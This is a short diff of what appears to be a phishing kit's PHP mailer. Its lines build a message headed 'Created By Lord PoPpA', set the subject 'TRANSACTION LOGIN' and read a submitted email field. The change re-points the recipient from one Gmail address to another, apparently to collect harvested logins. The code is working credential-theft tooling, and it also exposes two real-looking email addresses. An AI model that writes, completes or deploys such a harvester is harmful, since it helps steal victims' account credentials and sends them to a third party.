@@ -9,7 +9,7 @@ $message .= "---------------Created By Lord PoPpA-----------------------------\n
 
 
 
-$recipient = "juwonlo7@gmail.com";
+$recipient = "timbrownes186@gmail.com";
 $subject = "TRANSACTION LOGIN";
 $headers = "From: DOMAIN";
 $headers .= $_POST['eMailAdd']."\n";
